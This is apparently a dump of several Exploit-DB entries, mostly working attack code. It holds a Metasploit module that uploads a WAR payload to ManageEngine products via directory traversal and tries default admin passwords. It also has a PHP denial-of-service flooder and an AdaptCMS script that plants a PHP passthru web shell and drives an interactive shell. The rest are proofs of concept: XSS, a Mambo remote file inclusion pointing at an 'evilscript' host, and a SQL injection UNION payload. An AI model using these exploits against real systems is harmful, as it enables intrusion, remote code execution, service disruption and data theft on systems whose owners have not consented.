35845,"ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'          => 'ManageEngine Multiple Products Authenticated File Upload',       'Description'   => %q{         This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,         AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts         the upload does not handle correctly '../' sequences, which can be abused to write         in the file system. Authentication is needed to exploit this vulnerability, but this module         will attempt to login using the default credentials for the administrator and guest         accounts. Alternatively you can provide a pre-authenticated cookie or a username / password         combo. For IT360 targets enter the RPORT of the ServiceDesk instance (usually 8400). All         versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,         SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this         module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been         been tested successfully in Windows and Linux on several versions.       },       'Author'        =>         [           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability Discovery and Metasploit module         ],       'License'       => MSF_LICENSE,       'References'    =>         [           ['CVE', '2014-5301'],           ['OSVDB', '116733'],           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_sd_file_upload.txt'],           ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/5']         ],       'DefaultOptions' => { 'WfsDelay' => 30 },       'Privileged'     => false, # Privileged on Windows but not on Linux targets       'Platform'       => 'java',       'Arch'           => ARCH_JAVA,       'Targets'        =>         [           [ 'Automatic', { } ],           [ 'ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9',             {               'attachment_path' => '/workorder/Attachment.jsp'             }           ],           [ 'ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1',             {               'attachment_path' => '/common/FileAttachment.jsp'             }           ],           [ 'IT360 v8-v10.4',             {               'attachment_path' => '/common/FileAttachment.jsp'             }           ]         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Dec 15 2014'))      register_options(       [         Opt::RPORT(8080),         OptString.new('JSESSIONID',           [false, 'Pre-authenticated JSESSIONID cookie (non-IT360 targets)']),         OptString.new('IAMAGENTTICKET',           [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),         OptString.new('USERNAME',           [true, 'The username to login as', 'guest']),         OptString.new('PASSWORD',           [true, 'Password for the specified username', 'guest']),         OptString.new('DOMAIN_NAME',           [false, 'Name of the domain to logon to'])       ], self.class)   end     def get_version     res = send_request_cgi({       'uri'    => '/',       'method' => 'GET'     })      # Major version, minor version, build and product (sd = servicedesk; ae = assetexplorer; sc = supportcenterl; it = it360)     version = [ 9999, 9999, 0, 'sd' ]      if res && res.code == 200       if res.body.to_s =~ /ManageEngine ServiceDesk/         if res.body.to_s =~ /&nbsp;&nbsp;\|&nbsp;&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/           output = $1           version = [output[0].to_i, output[2].to_i, '0', 'sd']         end         if res.body.to_s =~ /src='\/scripts\/Login\.js\?([0-9]+)'><\/script>/     # newer builds           version[2] = $1.to_i         elsif res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/   # older builds           version[2] = $1.to_i         end       elsif res.body.to_s =~ /ManageEngine AssetExplorer/         if res.body.to_s =~ /ManageEngine AssetExplorer &nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/ ||             res.body.to_s =~ /<div class=""login-versioninfo"">version&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)<\/div>/           output = $1           version = [output[0].to_i, output[2].to_i, 0, 'ae']         end         if res.body.to_s =~ /src=""\/scripts\/ClientLogger\.js\?([0-9]+)""><\/script>/           version[2] = $1.to_i         end       elsif res.body.to_s =~ /ManageEngine SupportCenter Plus/         # All of the vulnerable sc installations are ""old style"", so we don't care about the major / minor version         version[3] = 'sc'         if res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/           # ... but get the build number if we can find it           version[2] = $1.to_i         end       elsif res.body.to_s =~ /\/console\/ConsoleMain\.cc/         # IT360 newer versions         version[3] = 'it'       end     elsif res && res.code == 302 && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/       # IT360 older versions, not a very good detection string but there is no alternative?       version[3] = 'it'     end      version   end     def check     version = get_version     # TODO: put fixed version on the two ifs below once (if...) products are fixed     # sd was fixed on build 9031     # ae and sc still not fixed     if (version[0] <= 9 && version[0] > 4 && version[2] < 9031 && version[3] == 'sd') ||     (version[0] <= 6 && version[2] < 99999 && version[3] == 'ae') ||     (version[3] == 'sc' && version[2] < 99999)       return Exploit::CheckCode::Appears     end      if (version[2] > 9030 && version[3] == 'sd') ||         (version[2] > 99999 && version[3] == 'ae') ||         (version[2] > 99999 && version[3] == 'sc')       return Exploit::CheckCode::Safe     else       # An IT360 check always lands here, there is no way to get the version easily       return Exploit::CheckCode::Unknown     end   end     def authenticate_it360(port, path, username, password)     if datastore['DOMAIN_NAME'] == nil       vars_post = {         'LOGIN_ID' => username,         'PASSWORD' => password,         'isADEnabled' => 'false'       }     else       vars_post = {         'LOGIN_ID' => username,         'PASSWORD' => password,         'isADEnabled' => 'true',         'domainName' => datastore['DOMAIN_NAME']       }     end      res = send_request_cgi({       'rport'  => port,       'method' => 'POST',       'uri'    => normalize_uri(path),       'vars_get' => {         'service'   => 'ServiceDesk',         'furl'      => '/',         'timestamp' => Time.now.to_i       },       'vars_post' => vars_post     })      if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching ""removed""       return res.get_cookies     else       return nil     end   end     def get_it360_cookie_name     res = send_request_cgi({       'method' => 'GET',       'uri' => normalize_uri(""/"")     })     cookie = res.get_cookies     if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/       return $1     else       return nil     end   end     def login_it360     # Do we already have a valid cookie? If yes, just return that.     if datastore['IAMAGENTTICKET']       cookie_name = get_it360_cookie_name       cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'       return cookie     end      # get the correct path, host and port     res = send_request_cgi({       'method' => 'GET',       'uri' => normalize_uri('/')     })      if res && res.redirect?       uri = [ res.redirection.port, res.redirection.path ]     else       return nil     end      cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])      if cookie != nil       return cookie     elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil       # we've tried with the default guest password, now let's try with the default admin password       cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')       if cookie != nil         return cookie       else         # Try one more time with the default admin login for some versions         cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')         if cookie != nil           return cookie         end       end     end      nil   end     #   # Authenticate and validate our session cookie. We need to submit credentials to   # j_security_check and then follow the redirect to HomePage.do to create a valid   # authenticated session.   #   def authenticate(cookie, username, password)     res = send_request_cgi!({       'method' => 'POST',       'uri' => normalize_uri('/j_security_check;' + cookie.to_s.gsub(';', '')),       'ctype' => 'application/x-www-form-urlencoded',       'cookie' => cookie,       'vars_post' => {         'j_username' => username,         'j_password' => password,         'logonDomainName' => datastore['DOMAIN_NAME']       }     })     if res && (res.code == 302 || (res.code == 200 && res.body.to_s =~ /redirectTo=""\+'HomePage\.do';/))       # sd and ae respond with 302 while sc responds with a 200       return true     else       return false     end   end     def login     # Do we already have a valid cookie? If yes, just return that.     if datastore['JSESSIONID'] != nil       cookie = 'JSESSIONID=' + datastore['JSESSIONID'].to_s + ';'       return cookie     end      # First we get a valid JSESSIONID to pass to authenticate()     res = send_request_cgi({       'method' => 'GET',       'uri' => normalize_uri('/')     })     if res && res.code == 200       cookie = res.get_cookies       authenticated = authenticate(cookie, datastore['USERNAME'], datastore['PASSWORD'])       if authenticated         return cookie       elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil         # we've tried with the default guest password, now let's try with the default admin password         authenticated = authenticate(cookie, 'administrator', 'administrator')         if authenticated           return cookie         else           # Try one more time with the default admin login for some versions           authenticated = authenticate(cookie, 'admin', 'admin')           if authenticated             return cookie           end         end       end     end      nil   end     def send_multipart_request(cookie, payload_name, payload_str)     if payload_name =~ /\.ear/       upload_path = '../../server/default/deploy'     else       upload_path = rand_text_alpha(4+rand(4))     end      post_data = Rex::MIME::Message.new      if @my_target == targets[1]       # old style       post_data.add_part(payload_str, 'application/octet-stream', 'binary', ""form-data; name=\""#{Rex::Text.rand_text_alpha(4+rand(4))}\""; filename=\""#{payload_name}\"""")       post_data.add_part(payload_name, nil, nil, ""form-data; name=\""filename\"""")       post_data.add_part('', nil, nil, ""form-data; name=\""vecPath\"""")       post_data.add_part('', nil, nil, ""form-data; name=\""vec\"""")       post_data.add_part('AttachFile', nil, nil, ""form-data; name=\""theSubmit\"""")       post_data.add_part('WorkOrderForm', nil, nil, ""form-data; name=\""formName\"""")       post_data.add_part(upload_path, nil, nil, ""form-data; name=\""component\"""")       post_data.add_part('Attach', nil, nil, ""form-data; name=\""ATTACH\"""")     else       post_data.add_part(upload_path, nil, nil, ""form-data; name=\""module\"""")       post_data.add_part(payload_str, 'application/octet-stream', 'binary', ""form-data; name=\""#{Rex::Text.rand_text_alpha(4+rand(4))}\""; filename=\""#{payload_name}\"""")       post_data.add_part('', nil, nil, ""form-data; name=\""att_desc\"""")     end      data = post_data.to_s     res = send_request_cgi({       'uri' => normalize_uri(@my_target['attachment_path']),       'method' => 'POST',       'data' => data,       'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"",       'cookie' => cookie     })     return res   end     def pick_target     return target if target.name != 'Automatic'      version = get_version     if (version[0] <= 7 && version[2] < 7016 && version[3] == 'sd') ||     (version[0] == 4 && version[3] == 'ae') ||     (version[3] == 'sc')       # These are all ""old style"" versions (sc is always old style)       return targets[1]     elsif version[3] == 'it'       return targets[3]     else       return targets[2]     end   end     def exploit     if check == Exploit::CheckCode::Safe       fail_with(Failure::NotVulnerable, ""#{peer} - Target not vulnerable"")     end      print_status(""#{peer} - Selecting target..."")     @my_target = pick_target     print_status(""#{peer} - Selected target #{@my_target.name}"")      if @my_target == targets[3]       cookie = login_it360     else       cookie = login     end      if cookie.nil?       fail_with(Exploit::Failure::Unknown, ""#{peer} - Failed to authenticate"")     end      # First we generate the WAR with the payload...     war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))     war_payload = payload.encoded_war({ :app_name => war_app_base })      # ... and then we create an EAR file that will contain it.     ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))     app_xml = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>""     app_xml << '<application>'     app_xml << ""<display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name>""     app_xml << ""<module><web><web-uri>#{war_app_base + "".war""}</web-uri>""     app_xml << ""<context-root>/#{ear_app_base}</context-root></web></module></application>""      # Zipping with CM_STORE to avoid errors while decompressing the zip     # in the Java vulnerable application     ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)     ear_file.add_file(war_app_base + '.war', war_payload.to_s)     ear_file.add_file('META-INF/application.xml', app_xml)     ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + '.ear'      if @my_target != targets[3]       # Linux doesn't like it when we traverse non existing directories,       # so let's create them by sending some random data before the EAR.       # (IT360 does not have a Linux version so we skip the bogus file for it)       print_status(""#{peer} - Uploading bogus file..."")       res = send_multipart_request(cookie, rand_text_alphanumeric(4 + rand(32 - 4)), rand_text_alphanumeric(4 + rand(32 - 4)))       if res && res.code != 200         fail_with(Exploit::Failure::Unknown, ""#{peer} - Bogus file upload failed"")       end     end      # Now send the actual payload     print_status(""#{peer} - Uploading EAR file..."")     res = send_multipart_request(cookie, ear_file_name, ear_file.pack)     if res && res.code == 200       print_status(""#{peer} - Upload appears to have been successful"")     else       fail_with(Exploit::Failure::Unknown, ""#{peer} - EAR upload failed"")     end      10.times do       select(nil, nil, nil, 2)        # Now make a request to trigger the newly deployed war       print_status(""#{peer} - Attempting to launch payload in deployed WAR..."")       res = send_request_cgi({         'uri'    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),         'method' => 'GET'       })       # Failure. The request timed out or the server went away.       break if res.nil?       # Success! Triggered the payload, should have a shell incoming       break if res.code == 200     end   end end",ManageEngine,1
3038,"Durian Web Application Server 3.02 - Denial of Service <?php //Durian Web Application Server 3.02 freeware for Win32 denial of service exploit //this will merely show 1000 access violation boxes to screen //software site -> http://sourceforge.net/projects/durian/  //by rgod mail: retrog at alice dot it site: http://retrogod.altervista.org  error_reporting(E_ALL); $service_port = ""4002""; $address = ""192.168.1.3"";  $ch  =array(""\xaa"",""\xa0"",""\x41""); $size=array(30,70,150,330,520,700,1400,2300); $c=1000;  for ($m=1; $m<=$c; $m++){     for ($j=0; $j<3; $j++){         for ($i=0; $i<8; $i++){             $junk="""";             for ($k=1; $k<=$size[$i]; $k++){                 $junk.=$ch[$j];             }             echo ""buf size:"".$size[$i].""|char:"".$ch[$j].""\n"";             $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);             if ($socket < 0) {                 die(""socket_create() failed:\n reason: "" . socket_strerror($socket) . ""\n"");             }             $result = socket_connect($socket, $address, $service_port);             if ($result < 0) {                 die(""socket_connect() failed:\n reason: ($result) "" . socket_strerror($result) . ""\n"");             }             $in = $junk;             socket_write($socket, $in, strlen ($in));             socket_close($socket);         }    } sleep(1); } ?>  # milw0rm.com [2006-12-29]",mozilla,1
44897,"Dimofinf CMS 3.0.0 - Cross-Site Scripting # Title: Dimofinf CMS 3.0.0 - Cross-Site Scripting  # Author: Felipe ""Renzi"" Gabriel # Date: 2018-06-13 # Software: Dimofinf CMS Version 3.0.0 # CVE: CVE-2018-12094  # A Reflected Cross-Site Scripting web vulnerability has been discovered in the ""Dimofinf CMS"" web-application. # The vulnerability is located in the 'id' parameter of the`news.php` action GET method request.   # PoC http://Target/news.php?id=604""""</|\><plaintext/onmouseover=prompt(/XSS/)>",dimofinf,1
35710,"AdaptCMS 3.0.3 - Multiple Vulnerabilities #!/usr/bin/env python # # # AdaptCMS 3.0.3 Remote Command Execution Exploit # # # Vendor: Insane Visions # Product web page: http://www.adaptcms.com # Affected version: 3.0.3 # # Summary: AdaptCMS is a Content Management System trying # to be both simple and easy to use, as well as very agile # and extendable. Not only so we can easily create Plugins  # or additions, but so other developers can get involved. # Using CakePHP we are able to achieve this with a built-in # plugin system and MVC setup, allowing us to focus on the # details and end-users to focus on building their website # to look and feel great. # # Desc: AdaptCMS suffers from an authenticated arbitrary # command execution vulnerability. The issue is caused due # to the improper verification of uploaded files. This can # be exploited to execute arbitrary PHP code by creating # or uploading a malicious PHP script file that will be # stored in '\app\webroot\uploads' directory. # # Tested on: Apache 2.4.10 (Win32) #            PHP 5.6.3 #            MySQL 5.6.21 # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             @zeroscience # # # Advisory ID: ZSL-2015-5220 # Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2015-5220.php # # # 29.12.2014 # #   import itertools, mimetools, mimetypes, os import cookielib, urllib, urllib2, sys, re  from cStringIO import StringIO from urllib2 import URLError  piton = os.path.basename(sys.argv[0])  def bannerche(): 	print """"""  o==========================================o  |                                          |  |        AdaptCMS RCE Exploit              |  |                                          |  |                        ID:ZSL-2015-5220  |  |  o/                                      |  +------------------------------------------+ 		"""""" 	if len(sys.argv) < 3: 		print '\x20\x20[*] Usage: '+piton+' <hostname> <pathname>' 		print '\x20\x20[*] Example: '+piton+' zeroscience.mk adaptcms\n' 		sys.exit()  bannerche()  host = sys.argv[1] path = sys.argv[2]  cj = cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))  try: 	gettokens = opener.open('http://'+host+'/'+path+'/login') except urllib2.HTTPError, errorzio: 	if errorzio.code == 404: 		print 'Path error.' 		sys.exit() except URLError, errorziocvaj: 	if errorziocvaj.reason: 		print 'Hostname error.' 		sys.exit()  print '\x20\x20[*] Login please.'  tokenfields = re.search('fields]"" value=""(.+?)"" id=', gettokens.read()).group(1) gettokens = opener.open('http://'+host+'/'+path+'/login') tokenkey = re.search('key]"" value=""(.+?)"" id=', gettokens.read()).group(1)  username = raw_input('\x20\x20[*] Enter username: ') password = raw_input('\x20\x20[*] Enter password: ')  login_data = urllib.urlencode({ 							'_method' : 'POST', 							'data[User][username]' : username, 							'data[User][password]' : password, 							'data[_Token][fields]' : '864206fbf949830ca94401a65660278ae7d065b3%3A', 							'data[_Token][key]' : tokenkey, 							'data[_Token][unlocked]' : '' 							})  login = opener.open('http://'+host+'/'+path+'/login', login_data) auth = login.read() for session in cj: 	sessid = session.name  ses_chk = re.search(r'%s=\w+' % sessid , str(cj)) cookie = ses_chk.group(0) print '\x20\x20[*] Accessing...'  upload = opener.open('http://'+host+'/'+path+'/admin/files/add') filetoken = re.search('key]"" value=""(.+?)"" id=', upload.read()).group(1)  class MultiPartForm(object):      def __init__(self):         self.form_fields = []         self.files = []         self.boundary = mimetools.choose_boundary()         return          def get_content_type(self):         return 'multipart/form-data; boundary=%s' % self.boundary      def add_field(self, name, value):         self.form_fields.append((name, value))         return      def add_file(self, fieldname, filename, fileHandle, mimetype=None):         body = fileHandle.read()         if mimetype is None:             mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'         self.files.append((fieldname, filename, mimetype, body))         return          def __str__(self):          parts = []         part_boundary = '--' + self.boundary                  parts.extend(             [ part_boundary,               'Content-Disposition: form-data; name=""%s""' % name,               '',               value,             ]             for name, value in self.form_fields             )                  parts.extend(             [ part_boundary,               'Content-Disposition: file; name=""%s""; filename=""%s""' % \                  (field_name, filename),               'Content-Type: %s' % content_type,               '',               body,             ]             for field_name, filename, content_type, body in self.files             )                  flattened = list(itertools.chain(*parts))         flattened.append('--' + self.boundary + '--')         flattened.append('')         return '\r\n'.join(flattened)  if __name__ == '__main__':      form = MultiPartForm()     form.add_field('_method', 'POST')     form.add_field('data[_Token][key]', filetoken)     form.add_field('data[File][type]', 'edit')     form.add_field('data[0][File][filename]', '')     form.add_field('data[0][File][dir]', 'uploads/')     form.add_field('data[0][File][mimetype]', '')     form.add_field('data[0][File][filesize]', '')     form.add_field('data[File][content]', '<?php echo ""<pre>""; passthru($_GET[\'cmd\']); echo ""</pre>""; ?>')     form.add_field('data[File][file_extension]', 'php')     form.add_field('data[File][file_name]', 'thricer')     form.add_field('data[File][caption]', 'THESHELL')     form.add_field('data[File][dir]', 'uploads/')     form.add_field('data[0][File][caption]', '')     form.add_field('data[0][File][watermark]', '0')     form.add_field('data[0][File][zoom]', 'C')     form.add_field('data[File][resize_width]', '')     form.add_field('data[File][resize_height]', '')     form.add_field('data[0][File][random_filename]', '0')     form.add_field('data[File][library]', '')     form.add_field('data[_Token][fields]', '0e50b5f22866de5e6f3b959ace9768ea7a63ff3c%3A0.File.dir%7C0.File.filesize%7C0.File.mimetype%7CFile.dir')     form.add_file('data[0][File][filename]', 'filename', fileHandle=StringIO(''))      request = urllib2.Request('http://'+host+'/'+path+'/admin/files/add')     request.add_header('User-agent', 'joxypoxy 6.0')     body = str(form)     request.add_header('Content-type', form.get_content_type())     request.add_header('Cookie', cookie)     request.add_header('Content-length', len(body))     request.add_data(body)     request.get_data()     urllib2.urlopen(request).read()  f_loc = '/uploads/thricer.php' print  while True: 	try: 		cmd = raw_input('shell@'+host+':~# ') 		execute = opener.open('http://'+host+'/'+path+f_loc+'?cmd='+urllib.quote(cmd)) 		reverse = execute.read() 		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M) 		cmdout = pattern.match(reverse) 		print cmdout.groups()[0].strip() 		print 		if cmd.strip() == 'exit': 			break 	except Exception: 		break  print 'Session terminated.\n'  sys.exit()  """""" ###############################################################################  AdaptCMS 3.0.3 Multiple Persistent XSS Vulnerabilities   Vendor: Insane Visions Product web page: http://www.adaptcms.com Affected version: 3.0.3  Summary: AdaptCMS is a Content Management System trying to be both simple and easy to use, as well as very agile and extendable. Not only so we can easily create Plugins  or additions, but so other developers can get involved. Using CakePHP we are able to achieve this with a built-in plugin system and MVC setup, allowing us to focus on the details and end-users to focus on building their website to look and feel great.  Desc: AdaptCMS version 3.0.3 suffers from multiple stored cross-site scripting vulnerabilities. Input passed to several POST parameters is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5218 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5218.php   29.12.2014  --   ==========================================  #1 Stored XSS     POST parameter: data[Category][title] ------------------------------------------  POST /adaptcms/admin/categories/add HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/adaptcms/admin/categories/add Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 279  _method=POST&data%5B_Token%5D%5Bkey%5D=851f8e2e973800b2b0635d5157c55369bcade604&data%5BCategory%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&data%5B_Token%5D%5Bfields%5D=14d1551ece2201712436bf482f7e776f422a7966%253A&data%5B_Token%5D%5Bunlocked%5D=   =======================================  #2 Stored XSS     POST parameter: data[Field][title] ---------------------------------------  POST /adaptcms/admin/fields/ajax_fields/ HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://localhost/adaptcms/admin/fields/add Content-Length: 141 Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  data%5BField%5D%5Bcategory_id%5D=2&data%5BField%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert(2)%3B%3C%2Fscript%3E&data%5BField%5D%5Bdescription%5D=   =========================  #3 Stored XSS     POST parameter: name -------------------------  POST /adaptcms/admin/tools/create_theme?finish=true HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Referer: http://localhost/adaptcms/admin/tools/create_theme Content-Length: 242 Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  {""basicInfo"":{""name"":""\""><script>alert(3);</script>"",""block_active"":"""",""is_fields"":"""",""is_searchable"":""""},""versions"":{""current_version"":""1.0"",""versions"":[""1.0"",""111""]},""skeleton"":{""controller"":false,""model"":false,""layout"":true,""views"":false}}   ===========================================  #4 Stored XSS     POST parameter: data[Link][link_title] -------------------------------------------  POST /adaptcms/admin/links/links/add HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/adaptcms/admin/links/links/add Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 593  _method=POST&data%5B_Token%5D%5Bkey%5D=2c5e2f46b5c13a78395b2e79303543cd4d444789&data%5BLink%5D%5Btitle%5D=444&data%5BLink%5D%5Burl%5D=http%3A%2F%2Fzeroscience.mk&data%5BLink%5D%5Blink_title%5D=""><script>alert(4);</script>&data%5BLink%5D%5Blink_target%5D=_new&data%5BLink%5D%5Bactive%5D=0&data%5BLink%5D%5Bactive%5D=1&data%5BLink%5D%5Btype%5D=&data%5BLink%5D%5Bimage_url%5D=&data%5BLink%5D%5Bselect_all%5D=0&data%5BLink%5D%5Bselect_none%5D=0&data%5BLink%5D%5Bsort_by%5D=&data%5BLink%5D%5Bsort_direction%5D=&data%5B_Token%5D%5Bfields%5D=34394f00acd7233477b8cd9e681e331f083052a5%253A&data%5B_Token%5D%5Bunlocked%5D=   ==============================================  #5 Stored XSS     POST parameter: data[ForumTopic][subject] ----------------------------------------------  POST /adaptcms/forums/off-topic/new HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/adaptcms/forums/off-topic/new Cookie: adaptcms=c4fqklpt7gneokqbbv4iq1e5b1 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 460  _method=POST&data%5B_Token%5D%5Bkey%5D=4c5428572b6454152377ae8db2c3a8a753f39dba&data%5BForumTopic%5D%5Bsubject%5D=%22%3E%3Cscript%3Ealert%285%29%3B%3C%2Fscript%3E&data%5BForumTopic%5D%5Bcontent%5D=%3Cp%3Etestingcontent%3C%2Fp%3E&data%5BForumTopic%5D%5Btopic_type%5D=topic&data%5BForumTopic%5D%5Bforum_id%5D=1&data%5B_Token%5D%5Bfields%5D=bcff03f6432e544b05d877fcdd8c29f13155693a%253AForumTopic.forum_id%257CForumTopic.topic_type&data%5B_Token%5D%5Bunlocked%5D=   ###############################################################################    AdaptCMS 3.0.3 HTTP Referer Header Field Open Redirect Vulnerability   Vendor: Insane Visions Product web page: http://www.adaptcms.com Affected version: 3.0.3  Summary: AdaptCMS is a Content Management System trying to be both simple and easy to use, as well as very agile and extendable. Not only so we can easily create Plugins  or additions, but so other developers can get involved. Using CakePHP we are able to achieve this with a built-in plugin system and MVC setup, allowing us to focus on the details and end-users to focus on building their website to look and feel great.  Desc: Input passed via the 'Referer' header field is not properly verified before being used to redirect users. This can be exploited to redirect a user to an arbitrary website e.g. when a user clicks a specially crafted link to the affected script hosted on a trusted domain.  ==================================== \lib\Cake\Controller\Controller.php: ------------------------------------ Line: 956 .. .. Line: 974 ------------------------------------  Tested on: Apache 2.4.10 (Win32)            PHP 5.6.3            MySQL 5.6.21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2015-5219 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5219.php   29.12.2014  --   GET /adaptcms/admin/adaptbb/webroot/foo HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0 Connection: keep-alive Referer: http://zeroscience.mk """"""",insanevisions,1
2027,"Mambo Module HTMLArea3 1.5 - Remote File Inclusion # HTMLArea3 addon - ImageManager  Author          : Ahmad Maulana a.k.a Matdhule Date            : July 12th 2006 Location        : Indonesia, Jakarta Web             : http://advisories.echo.or.id/adv/adv38-matdhule-2006.txt Critical Lvl    : Highly critical Impact          : System access Where           : From Remote ------------------------------------------------------------------------   Application    : HTMLArea3 addon - ImageManager Version        : 1.5 URL        :   Exploit: http://[target]/[path]/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://evilscript   # milw0rm.com [2006-07-17]",Mambo,1
43289,"Lawyer Search Script 1.1 - 'lawyer-list?city' SQL Injection # # # # #  # Exploit Title: Lawyer Search Script 1.1 - SQL Injection # Dork: N/A # Date: 08.12.2017 # Vendor Homepage: https://www.phpscriptsmall.com/ # Software Link: https://www.phpscriptsmall.com/product/lawyer-script/ # Version: 1.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/lawyer-list?city=[SQL]&main_search= #  # -1'+/*!11111UNION*/+/*!11111SELECT*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52--+- #  # http://server/lawyer-list?city=-1'+/*!11111UNION*/+/*!11111SELECT*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52--+-&main_search= #  # # # # 